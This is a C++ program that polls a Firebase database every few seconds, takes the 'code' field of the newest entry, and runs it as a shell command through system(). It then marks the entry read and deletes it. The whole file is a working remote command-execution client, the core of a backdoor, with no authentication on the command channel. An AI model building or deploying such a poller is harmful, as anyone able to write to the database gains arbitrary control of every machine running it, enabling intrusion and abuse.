#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <cstdlib>
#include <curl/curl.h>
#include "json/json.h"
#include "json/json-forwards.h"

using namespace std;

#define REFRESH 2

string currentKey;

size_t getData(void *buffer, size_t size, size_t nmemb, void *userp)
{
	string nullCheck = (char*)buffer;
	if(!nullCheck.compare("null"))
	{
		return size*nmemb;
	}

	Json::Value* root = (Json::Value *)(userp);
	Json::Reader reader;
	reader.parse((char*)buffer,(*root));

	string key = (*root).begin().key().asString();
	string code = (*root)[key].get("code","").asString();
	system(code.c_str());

	(*root)[key]["read"] = true;
	cout<<"reading data: \n"<<(*root)<<endl;
	
	return size*nmemb;
}

CURLcode writeData(Json::Value root)
{
	cout<<"writing data\n";
	CURL *curl;
	CURLcode res;

	Json::FastWriter writer;
	string value = writer.write(root[root.begin().key().asString()]);


	string url = "https://testproject-9ac78.firebaseio.com/testData/read/";
	url.append(root.begin().key().asString());
	url.append(".json");

	curl = curl_easy_init();
	if(!curl)
	{
		cout<<"cant initialize";
		return CURLE_FAILED_INIT;
	}

	curl_easy_setopt(curl, CURLOPT_URL, url.c_str());  
	curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");  
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, value.c_str());

	try{
		res = curl_easy_perform(curl);
	}
	catch(...)
	{
		cout<<"error: "<<res;
	}
	return res;
}

CURLcode deleteData(CURL* curl, Json::Value root)
{
	cout<<"deleting data: \n"<<root<<endl;
	string key = root.begin().key().asString();

	string url = "https://testproject-9ac78.firebaseio.com/testData/unread/";
	url.append(key);
	url.append(".json");


	curl_easy_setopt(curl, CURLOPT_URL, url.c_str());  
	curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "DELETE");

	CURLcode res;

	try{
		res = curl_easy_perform(curl);
	}
	catch(...)
	{
		cout<<"error deleting: "<<res<<endl;
	}

	return res;
}

int main()
{
	CURL *curl;
	CURLcode res;
	time_t start,current;

	time(&start);
	int refresh = REFRESH;
	while(true)
	{
		time(&current);

		if(current - start < refresh)
		continue;

		Json::Value root;
		root["empty"] = true;
		curl = curl_easy_init();
		curl_easy_setopt(curl, CURLOPT_URL, "https://testproject-9ac78.firebaseio.com/testData/unread.json?orderBy=\"i\"&limitToFirst=1");
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, getData);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&root);

		res = curl_easy_perform(curl);

		if(res != CURLE_OK)
		{
			fprintf(stderr, "read failed");
		}

		if(root["empty"].isNull() == false)
		{
			cout<<".\n";
			if(refresh < 120)
				refresh+=2;
			continue;
		}

		res = writeData(root);

		if(res != CURLE_OK)
		{
			cout<<"write failed: "<<res<<endl;
			return 2;
		}

		res = deleteData(curl,root);

		if(res != CURLE_OK)
		{
			fprintf(stderr, "delete failed");
			return 3;
		}

		refresh = REFRESH;
		curl_easy_cleanup(curl);
		time(&start);
	}
	return 0;

}
